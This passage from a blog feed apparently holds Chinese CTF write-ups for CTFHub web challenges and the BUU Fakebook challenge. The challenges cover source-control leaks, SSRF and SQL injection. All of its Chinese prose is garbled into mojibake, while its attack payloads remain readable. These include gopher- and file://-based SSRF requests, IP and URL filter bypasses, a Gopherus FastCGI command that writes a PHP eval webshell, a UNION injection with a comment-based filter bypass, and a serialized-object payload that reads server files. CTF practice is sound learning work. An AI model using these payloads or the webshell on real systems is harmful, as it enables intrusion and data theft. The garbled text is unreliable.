<blockquote><p>vimç¼–è¾‘æ–‡ä»¶ä¼šè‡ªåŠ¨ç”Ÿæˆå¤‡ä»½æ–‡ä»¶ä»¥åŠä¸´æ—¶æ–‡ä»¶<br>ä¸´æ—¶æ–‡ä»¶æ˜¯åœ¨ç¼–è¾‘æ–‡æœ¬æ—¶å°±ä¼šåˆ›å»ºçš„æ–‡ä»¶ï¼Œå¦‚æœç¨‹åºæ­£å¸¸é€€å‡ºï¼Œä¸´æ—¶æ–‡ä»¶è‡ªåŠ¨åˆ é™¤ï¼Œå¦‚æœæ„å¤–é€€å‡ºå°±ä¼šä¿ç•™ï¼Œæ–‡ä»¶åä¸º  <code>.filename.swpï¼Œ</code>ï¼ˆç¬¬ä¸€æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º<code>.filename.txt.swp</code>ï¼›å†æ¬¡æ„å¤–é€€å‡ºåï¼Œå°†ä¼šäº§ç”Ÿåä¸º<code>.filename.txt.swo</code>çš„äº¤æ¢æ–‡ä»¶ï¼›è€Œç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åˆ™ä¸º<code>.filename.txt.swn</code>ï¼‰      </p></blockquote></li></ul><p><img src="https://s1.imagehub.cc/images/2021/02/05/04.png" alt="04.png"><br>æ ¹æ®æç¤ºï¼Œè®¿é—®<code>.index.php.swp</code>å¾—åˆ°æ–‡ä»¶       </p><h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><ul><li>çŸ¥è¯†ç‚¹   <blockquote><p><code>.DS_Store</code>æ˜¯ Mac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ã€‚é€šè¿‡<code>.DS_Store</code>å¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚</p></blockquote></li></ul><p>å¾—åˆ°æ–‡ä»¶åç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œnotepadä¼šæœ‰è®¸å¤š<code>NULL</code>      </p><h2 id="Gitæ³„éœ²"><a href="#Gitæ³„éœ²" class="headerlink" title="Gitæ³„éœ²"></a>Gitæ³„éœ²</h2><h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p>æ ¹æ®æç¤ºç”¨<a href="https://blog.csdn.net/qq_44841017/article/details/105733100">githack</a><br><code>python GitHack.py http://challenge-01d55127514c37b5.sandbox.ctfhub.com:10080/.git/</code>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œgithackéœ€è¦åœ¨python2ä¸‹è¿è¡Œkalié»˜è®¤pythonæ˜¯2.x,å¦‚éœ€æ›´æ¢è¿è¡Œå‘½ä»¤<code>alias python=â€™/usr/bin/python3â€™</code>è¿™åªæ˜¯æš‚æ—¶çš„ï¼Œé‡æ–°å¼€å¯ç»ˆç«¯ä¼šè¿˜åŸ <img src="https://ftp.bmp.ovh/imgs/2021/02/723886d5344eeed7.png"><br><code>git log</code>æŸ¥çœ‹æäº¤commit history<img src="https://ftp.bmp.ovh/imgs/2021/02/c0eb6c8ca5a7bde7.png"><br><code>git diff</code>æ¯”è¾ƒæ–‡ä»¶çš„ä¸åŒï¼Œå³æ¯”è¾ƒæ–‡ä»¶åœ¨æš‚å­˜åŒºå’Œå·¥ä½œåŒºçš„å·®å¼‚ã€‚<br><img src="https://ftp.bmp.ovh/imgs/2021/02/e469825c9cdfb249.png"><br>æˆ–è€…ç›´æ¥<code>git log -p</code>ä¹Ÿå¯<a href="https://blog.csdn.net/jjlovefj/article/details/86476925">more</a></p><h3 id="stash"><a href="#stash" class="headerlink" title="stash"></a>stash</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/02/0a4ff12cf20d5d8c.png"> </p><h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/02/71d91a8d826e6a27.png"><br><img src="https://ae02.alicdn.com/kf/H4a3d4c7743ad4c14aa8436a33fcd3867E.jpg" alt="206.png">      </p><h2 id="svnæ³„éœ²"><a href="#svnæ³„éœ²" class="headerlink" title="svnæ³„éœ²"></a>svnæ³„éœ²</h2><p><img src="https://ae04.alicdn.com/kf/H4a82f10c66a441eb88e7f4605de8a5fc4.jpg" alt="301.png"><br>å½“å¼€å‘äººå‘˜ä½¿ç”¨ SVN è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.svnæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† SVN æ³„éœ²æ¼æ´ã€‚</p><p>éœ€è¦ç”¨åˆ°ä¸€ä¸ªå·¥å…·<code>https://github.com/kost/dvcs-ripper</code>            </p><ul><li>å®‰è£… ï¼š<code>sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</code>     </li><li>ä¸‹è½½ï¼š<code>git clone https://github.com/kost/dvcs-ripper</code>       </li><li>è¿›å…¥ç›®å½•â€”-<code>./rip-svn.pl -v -u http://challenge-05b7bb06a8d52597.sandbox.ctfhub.com:10080/.svn/</code><br><img src="https://ae02.alicdn.com/kf/H29c34143c01d4d5d8e779d0e2486633bO.jpg" alt="302.png"><br>svn1.7åŠä»¥åç‰ˆæœ¬åˆ™åªåœ¨é¡¹ç›®æ ¹ç›®å½•ç”Ÿæˆä¸€ä¸ª.svnæ–‡ä»¶å¤¹ï¼Œé‡Œé¢çš„pristineæ–‡ä»¶å¤¹é‡ŒåŒ…å«äº†æ•´ä¸ªé¡¹ç›®çš„æ‰€æœ‰æ–‡ä»¶å¤‡ä»½<img src="https://sc02.alicdn.com/kf/He5b38923481e44aa991f5d9a8af4c606r.jpg" alt="303.png">     <h2 id="HGæ³„éœ²"><a href="#HGæ³„éœ²" class="headerlink" title="HGæ³„éœ²"></a>HGæ³„éœ²</h2>å½“å¼€å‘äººå‘˜ä½¿ç”¨ Mercurial è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.hg æ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† hg æ³„éœ²æ¼æ´ã€‚<br>ä½¿ç”¨<code>dvcs-ripper</code>é‡Œçš„<code>rip-hg.pl</code>è·å–<code>.hg</code><br><img src="https://ae03.alicdn.com/kf/H8d9f7059f12149038acda9a79def182fz.jpg" alt="304.png"><br>è¿›å…¥<code>.hg/</code><img src="https://ae04.alicdn.com/kf/H20378cb9f63b45fb87a76966b69ee5b82.jpg" alt="305.png"><br>ç½‘é¡µè®¿é—®å¾—åˆ°flag     <h2 id="å¯†ç å£ä»¤"><a href="#å¯†ç å£ä»¤" class="headerlink" title="å¯†ç å£ä»¤"></a>å¯†ç å£ä»¤</h2><h3 id="é»˜è®¤å£ä»¤"><a href="#é»˜è®¤å£ä»¤" class="headerlink" title="é»˜è®¤å£ä»¤"></a>é»˜è®¤å£ä»¤</h3><img src="https://ae04.alicdn.com/kf/H1008cfe9ce7444b3941d6673d77452d1T.jpg" alt="401.png"><br>ç™¾åº¦æœç´¢:<code>å¸¸è§è®¾å¤‡é»˜è®¤å£ä»¤</code><br>æ‰¾åˆ°äº¿é‚®é‚®ä»¶ç½‘å…³çš„é»˜è®¤ç”¨æˆ·åå’Œå¯†ç â€”ç™»å½•<br><a href="https://blog.csdn.net/weixin_40399254/article/details/106469069">å¸¸è§è®¾å¤‡é»˜è®¤å£ä»¤</a><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3></li></ul><p>æ¥æ¥æ¥æ€§æ„ŸCTFHubåœ¨çº¿æ‰«ç«¯å£,æ®è¯´ç«¯å£èŒƒå›´æ˜¯8000-9000å“¦          </p><p><img src="https://ae02.alicdn.com/kf/U9aac43ac8c544d01963111fc9be06a91h.jpg" alt="501.png"><br>é¢˜ç›®æ˜¯ç«¯å£æ‰«æï¼Œç»™äº†èŒƒå›´ï¼Œå¯ä»¥ç”¨burpçˆ†ç ´<br>æŠ“åŒ…<br>åœ¨SSRFä¸­ï¼Œdictåè®®ä¸httpåè®®å¯ç”¨æ¥æ¢æµ‹å†…ç½‘çš„ä¸»æœºå­˜æ´»ä¸ç«¯å£å¼€æ”¾æƒ…å†µ<br><img src="https://ae04.alicdn.com/kf/Udb8ff8141f11458f8592a495df9dae77Y.jpg" alt="502.png"><br>è®¾ç½®<br><img src="https://ae03.alicdn.com/kf/U237150ace53d40ad8b149c0880bd075bc.jpg" alt="503.png"><br>ç»“æœ<br><img src="https://ae02.alicdn.com/kf/U2ff238abbe8f47c3906bce8991367077Q.jpg" alt="504.png"><br>è®¿é—®å¾—åˆ°flag      </p><h3 id="å†…ç½‘è®¿é—®"><a href="#å†…ç½‘è®¿é—®" class="headerlink" title="å†…ç½‘è®¿é—®"></a>å†…ç½‘è®¿é—®</h3><p>å°è¯•è®¿é—®ä½äº127.0.0.1çš„flag.phpå§         </p><p>payloadï¼š<code>url=127.0.0.1/flag.php</code>       </p><h3 id="ä¼ªåè®®è¯»å–æ–‡ä»¶"><a href="#ä¼ªåè®®è¯»å–æ–‡ä»¶" class="headerlink" title="ä¼ªåè®®è¯»å–æ–‡ä»¶"></a>ä¼ªåè®®è¯»å–æ–‡ä»¶</h3><p>å°è¯•å»è¯»å–ä¸€ä¸‹Webç›®å½•ä¸‹çš„flag.phpå§        </p><p>é¢˜ç›®è¯´æ˜¯webç›®å½•ï¼Œç”¨fileä¼ªåè®®å³å¯<br>payloadï¼š<code>url=file:///var/www/html/flag.php</code><br>webç›®å½•è¦è®°ä½          </p><h3 id="POSTè¯·æ±‚"><a href="#POSTè¯·æ±‚" class="headerlink" title="POSTè¯·æ±‚"></a>POSTè¯·æ±‚</h3><p>çœ‹wpè¯´èƒ½æ‰«å‡º<code>index.php</code>å’Œ<code>flag.php</code>çš„ï¼Œä½†æˆ‘æ²¡æ‰«å‡ºæ¥<br>ç›´æ¥è®¿é—®å§<br><code>/flag.php</code>â€”â€”-&gt;Just View From 127.0.0.1<br>é‚£ä¹ˆ<code>?url=127.0.0.1/flag.php</code><img src="https://sc03.alicdn.com/kf/U16e6dcbec9894950bdd8eadca49482ecL.jpg" alt="505.png"><br>å¯ä»¥ç”¨fileåè®®è¯»å–<code>flag.php</code>        </p><pre><code>&lt;?phperror_reporting(0);if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;    echo &quot;Just View From 127.0.0.1&quot;;    return;&#125;$flag=getenv(&quot;CTFHUB&quot;);$key = md5($flag);if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;    echo $flag;    exit;&#125;?&gt;</code></pre><p>æ²¡æœ‰æäº¤æŒ‰é’®ï¼Œå¯ä»¥ç”¨gopheråè®®æ„é€ postè¯·æ±‚       </p><pre><code>POST /flag.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 36key=308353d55f15e345a78047c613994fcb         </code></pre><p>å°†å…¶è¿›è¡Œurlç¼–ç ï¼Œ<br>ç„¶ååŠ ä¸Š<code>gopher://127.0.0.1:80/_</code><br>å†æ¬¡urlç¼–ç <br>æäº¤å¾—åˆ°flag<br>payloadï¼š<code>?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D308353d55f15e345a78047c613994fcb</code></p><h3 id="ä¸Šä¼ æ–‡ä»¶"><a href="#ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶"></a>ä¸Šä¼ æ–‡ä»¶</h3><p>è¿™ä¸ªå’Œä¸Šé¢é‚£ä¸ªå·®ä¸å¤šï¼Œä¹Ÿè¦ç”¨gopheråè®®<br>è®¿é—®flag.phpåæœ‰ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ²¡æäº¤æŒ‰é’®<br>å¯ä»¥è‡ªå·±æ„é€ ä¸€ä¸ª<code>&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</code><br>æäº¤æŠ“åŒ…<br>Hostæ”¹ä¸º<code>127.0.0.1</code><br>è¿‡ä¸€ä¸‹ä¸Šé¢çš„ç¼–ç æµç¨‹<br>æäº¤       </p><h3 id="FastCGIåè®®"><a href="#FastCGIåè®®" class="headerlink" title="FastCGIåè®®"></a>FastCGIåè®®</h3><p>è¿™æ¬¡.æˆ‘ä»¬éœ€è¦æ”»å‡»ä¸€ä¸‹fastcgiåè®®å’¯.ä¹Ÿè®¸é™„ä»¶çš„æ–‡ç« ä¼šå¯¹ä½ æœ‰ç‚¹å¸®åŠ©   </p><p>è¿™æ¬¡å¯ä»¥ä½¿ç”¨<code>Gopherus</code>å·¥å…·ç”Ÿæˆæ”»å‡»fastcgiçš„payload     </p><pre><code>python gopherus.py --exploit fastcgi/var/www/html/index.php                 # è¿™é‡Œè¾“å…¥çš„æ˜¯ä¸€ä¸ªå·²çŸ¥å­˜åœ¨çš„phpæ–‡ä»¶echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shell.php   #å†™å…¥ä¸€å¥è¯&lt;?php eval($_POST[whoami]);?&gt;</code></pre><p><a href="https://github.com/tarunkant/gopherus">gopher</a><br><img src="https://sc04.alicdn.com/kf/Ub52af498907e44fcb82b438d02f79f38P.jpg" alt="507.png"><br>å› ä¸ºè¦ä»¥GETä¼ å…¥ï¼Œæ‰€ä»¥è¦å†è¿›è¡Œä¸€æ¬¡urlç¼–ç <br>æäº¤åèšå‰‘è¿æ¥å³å¯<br><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Pç¥çš„fsatcgiåˆ†æ</a>        </p><h3 id="Rediaåè®®"><a href="#Rediaåè®®" class="headerlink" title="Rediaåè®®"></a>Rediaåè®®</h3><p>è¿™æ¬¡æ¥æ”»å‡»redisåè®®å§.redis://127.0.0.1:6379,èµ„æ–™?æ²¡æœ‰èµ„æ–™!è‡ªå·±æ‰¾!     </p><p>Rediaä¹Ÿå¯ä»¥ç”¨gopherusç›´æ¥ç”Ÿæˆpayload<br><img src="https://sc01.alicdn.com/kf/U59fa33c2723c4f3899da3f7205a6a573R.jpg" alt="508.png"><br>ä½†è¿™æ¬¡éœ€è¦å°†å¾—åˆ°çš„payloadè¿›è¡Œä¸¤æ¬¡urlç¼–ç ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä¸è¯¥æ˜¯ä¸€æ¬¡ä¹ˆï¼Ÿï¼Ÿ        </p><h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>è¯·æ±‚çš„URLä¸­å¿…é¡»åŒ…å«<a href="http://notfound.ctfhub.com,æ¥å°è¯•åˆ©ç”¨urlçš„ä¸€äº›ç‰¹æ®Šåœ°æ–¹ç»•è¿‡è¿™ä¸ªé™åˆ¶å§/">http://notfound.ctfhub.comï¼Œæ¥å°è¯•åˆ©ç”¨URLçš„ä¸€äº›ç‰¹æ®Šåœ°æ–¹ç»•è¿‡è¿™ä¸ªé™åˆ¶å§</a></p><p><img src="https://ae03.alicdn.com/kf/Ud3002561aaad433d8b3b07518fa317f2i.jpg" alt="509.png"><br><code>@</code><br>payloadï¼š<code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code>        </p><h3 id="æ•°å­—IP-Bypass"><a href="#æ•°å­—IP-Bypass" class="headerlink" title="æ•°å­—IP Bypass"></a>æ•°å­—IP Bypass</h3><p>è¿™æ¬¡banæ‰äº†127ä»¥åŠ172.ä¸èƒ½ä½¿ç”¨ç‚¹åˆ†åè¿›åˆ¶çš„IPäº†ã€‚ä½†æ˜¯åˆè¦è®¿é—®127.0.0.1ã€‚è¯¥æ€ä¹ˆåŠå‘¢      </p><p>è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œå…«è¿›åˆ¶å’Œåè¿›åˆ¶è²Œä¼¼ä¸è¡Œ<br><code>0x7f.0.0.1/flag.php</code>  </p><ul><li>å…¶ä»–æŒ‡å‘<code>127.0.0.1</code>çš„åœ°å€    <blockquote><p><a href="http://localhost/">http://localhost/</a><br><a href="http://0.0.0.0/">http://0/</a><br>http://[0:0:0:0:0:ffff:127.0.0.1]/<br>http://â‘ â‘¡â‘¦.â“ª.â“ª.â‘       </p></blockquote></li></ul><h3 id="302è·³è½¬-Bypass"><a href="#302è·³è½¬-Bypass" class="headerlink" title="302è·³è½¬ Bypass"></a>302è·³è½¬ Bypass</h3><p>SSRFä¸­æœ‰ä¸ªå¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯è¯·æ±‚å¯èƒ½ä¼šè·Ÿéš302è·³è½¬ï¼Œå°è¯•åˆ©ç”¨è¿™ä¸ªæ¥ç»•è¿‡å¯¹IPçš„æ£€æµ‹è®¿é—®åˆ°ä½äº127.0.0.1çš„flag.phpå§      </p><p>æŠ±ç€è¯•è¯•çš„å¿ƒæ€ï¼Œçœ‹ä¼šæœ‰ä»€ä¹ˆï¼Œç›´æ¥<code>?url=127.0.0.1/flag.php</code><br>å±…ç„¶å‡ºäº†flagï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ         </p><ul><li><code>.xip.io</code>      <blockquote><p>127.0.0.1.xip.ioâ€”â€”-&gt;127.0.0.1       </p></blockquote></li><li><a href="https://4m.cn/">çŸ­åœ°å€ç»•è¿‡</a><br>  <img src="https://ae02.alicdn.com/kf/U322cdf822f2d4381baff23981c4998dbA.jpg" alt="510.png">       </li></ul><h3 id="DNSé‡ç»‘å®š-Bypass"><a href="#DNSé‡ç»‘å®š-Bypass" class="headerlink" title="DNSé‡ç»‘å®š Bypass"></a>DNSé‡ç»‘å®š Bypass</h3><p>è¿™ä¸¤é“é¢˜æŒ‡å®šæ˜¯å‡ºæ¯›ç—…äº†<br>ç›´æ¥å°±å‡ºæ¥äº†ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ      </p><p>ä¸€ä¸ªç½‘ç«™è·å–æµ‹è¯•ç”¨çš„åŸŸå<code>https://lock.cmpxchg8b.com/rebinder.html</code><br><img src="https://ae03.alicdn.com/kf/Uffcd9a5275694a52a5104eed584e3e4bI.jpg" alt="511.png"><br>è¿™ä¸ªåŸŸåå¯ä»¥åœ¨ä¸¤ä¸ªIPé—´å˜æ¢ï¼Œæ‰€ä»¥å°±æœ‰å¯èƒ½åœ¨ç»è¿‡åˆ¤æ–­IPæ˜¯å¦åˆæ³•æ˜¯è§£æåˆ°åˆæ³•çš„é‚£ä¸ªIPï¼Œåœ¨å…¶è®¿é—®æ—¶è§£æåˆ°å†…ç½‘IP<br>æ‰€ä»¥è¦ä¸æ–­è®¿é—®<br><img src="https://image.3001.net/images/20201220/1608453315_5fdf0cc30da5af624b123.png"><br><a href="https://zhuanlan.zhihu.com/p/89426041">DNSé‡ç»‘å®š</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜022</title>
    <link href="/2021/02/05/BUU022/"/>
    <url>/2021/02/05/BUU022/</url>
    
    <content type="html"><![CDATA[<h2 id="äºŒåäºŒã€"><a href="#äºŒåäºŒã€" class="headerlink" title="äºŒåäºŒã€"></a>äºŒåäºŒã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[ç½‘é¼æ¯ 2018]Fakebook<br><img src="https://ftp.bmp.ovh/imgs/2021/02/60fda5da538b4fed.png"></p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è½¬äº†ä¸€åœˆæ²¡å‘ç°ä»€ä¹ˆä¿¡æ¯ï¼Œå…ˆjoinæ³¨å†Œä¸€ä¸ªçœ‹çœ‹å§<br>æ³¨å†Œåå‘ç°è‡ªå·±çš„ç”¨æˆ·åå¯ä»¥ç‚¹<br>ç‚¹è¿›å»<img src="https://ftp.bmp.ovh/imgs/2021/02/e439ef5ab0af2a57.png"><br>urlä¸­æœ‰<code>?no=1</code>åŠ ä¸Šä¸ªå•å¼•å·â€”â€“æŠ¥é”™<br>å¯ä»¥æ³¨å…¥<code>?no=2/2</code>è¿”å›åŸæ¥çš„ç•Œé¢â€”åˆ¤æ–­æ˜¯æ•°å­—å‹æ³¨å…¥<br>ç»æµ‹è¯•ï¼Œunionå’Œselectè¿åœ¨ä¸€èµ·è¢«è¿‡æ»¤ï¼Œå¯ä»¥<code>union/**/select</code>ç»•è¿‡<br><code>?no=2 union/**/select 1,2,3,4%23</code>çœ‹å›æ˜¾ä½<br><img src="https://ftp.bmp.ovh/imgs/2021/02/83843e2428edd86c.png"><br>å¯ä»¥çœ‹åˆ°æ˜¯<code>2</code>ä½ï¼Œæ¥ä¸‹æ¥åœ¨<code>2</code>ä½ä¸Šåšæ–‡ç« <br><code>?no=2 union/**/select 1,(select database()),3,4%23</code>çœ‹åº“åâ€”â€”-<code>fakebook</code><br><code>?no=2 union/**/select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;fakebook&#39;),3,4%23</code>è¡¨åâ€”â€”<code>users</code><br><code>?no=2 union/**/select 1,(select group_concat(column_name)from information_schemaã€‚columss where table_name=&#39;users&#39;),3,4%23</code>åˆ—å <img src="https://ftp.bmp.ovh/imgs/2021/02/ba2c9bb3cf8aa2b0.png"><br>æœ‰ä¸ªdata<img src="https://ftp.bmp.ovh/imgs/2021/02/e5ac564e3185f08b.png"><br>æ˜¯ä¸€ä¸²åºåˆ—åŒ–åçš„å­—èŠ‚æµ<br>åœ¨robots.txtä¸­å‘ç°<code>/user.php.bak</code>,å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œæ˜¯æºç </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name, $age, $blog</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;name = $name;        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)$age;        <span class="hljs-keyword">$this</span>-&gt;blog = $blog;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$url</span>)</span><span class="hljs-function">    </span>&#123;<span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ–°çš„curlèµ„æº</span>        $ch = curl_init();è®¾ç½®urlå’Œç›¸åº”çš„é€‰é¡¹        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);         <span class="hljs-comment">//å¦‚æœCURLOPT_RETURNTRANSFERä½œä¸ºä¸€ä¸ªé€‰é¡¹è¢«è®¾ç½®åˆ°ä¸€ä¸ªå…·ä½“çš„å¥æŸ„ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°å°†ä¼šä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›é‚£ä¸ªcURLå¥æŸ„è·å–çš„å†…å®¹ã€‚</span>        $output = curl_exec($ch);     <span class="hljs-comment">//æŠ“å–urlå¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨</span>        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;        &#125;        curl_close($ch);       <span class="hljs-comment">//å…³é—­curlèµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº</span>        <span class="hljs-keyword">return</span> $output;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $blog = <span class="hljs-keyword">$this</span>-&gt;blog;        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);    &#125;&#125;</code></pre></code></pre><p>å¤§è‡´æ„æ€å°±æ˜¯getå‡½æ•°é“¾æ¥blogçš„urlï¼Œå°†urlè¿”å›çš„æ•°æ®è¾“å‡ºåˆ°é¡µé¢ä¸Š<br>curlæ˜¯æ”¯æŒfileåè®®çš„ï¼Œè€Œä¸”sqlæ³¨å…¥çš„æ—¶å€™ä¹Ÿå¾—åˆ°äº†è·¯å¾„<br>æœ¬é¢˜è¿˜æœ‰ä¸ªflag.phpï¼Œwpè¯´å¾¡å‰‘èƒ½æ‰«å‡ºæ¥ï¼Œä½†æˆ‘æ‰«ä¸å‡ºæ¥<br>dataä¸­æ˜¯ä»¥åºåˆ—åŒ–å­˜å‚¨ä¿¡æ¯çš„ï¼ŒæŸ¥è¯¢æ—¶è¦å…ˆååºåˆ—åŒ–ï¼Œç„¶åå¾—åˆ°url<br>å¦‚æœè®©å®ƒæŸ¥è¯¢è¿”å›çš„åŒ…å«<code>file:///var/www/html/flag.php</code>å°±å¯ä»¥å¾—åˆ°flag<br>æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²   </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&quot;1&quot;</span>;    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;$a = <span class="hljs-keyword">new</span> UserInfo();<span class="hljs-keyword">echo</span> serialize($a);<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p><code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code>          </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p>payloadï¼š<code>?no=2 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;%23</code><br>æºç ä¸­å¾—åˆ°flag<br><img src="https://ftp.bmp.ovh/imgs/2021/02/d8a4939109cd9d6b.png"></p><h3 id="å…¶ä»–è§£æ³•"><a href="#å…¶ä»–è§£æ³•" class="headerlink" title="å…¶ä»–è§£æ³•"></a>å…¶ä»–è§£æ³•</h3><p>sqlæ³¨å…¥å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥      </p><hr><p>MySQLçš„load_fileå‡½æ•°</p><blockquote><p><code>LOAD_FILE(file_name) </code><br> å…¶ä¸­file_nameæ˜¯æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚</p></blockquote><p>payload:<code>?no=100 union/**/select 1,load_file(&#39;/var/www/html/flag.php&#39;),3,4 #</code>       </p><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><p>curl<img src="https://ftp.bmp.ovh/imgs/2021/02/b43bf24ea303eb35.png"><br><a 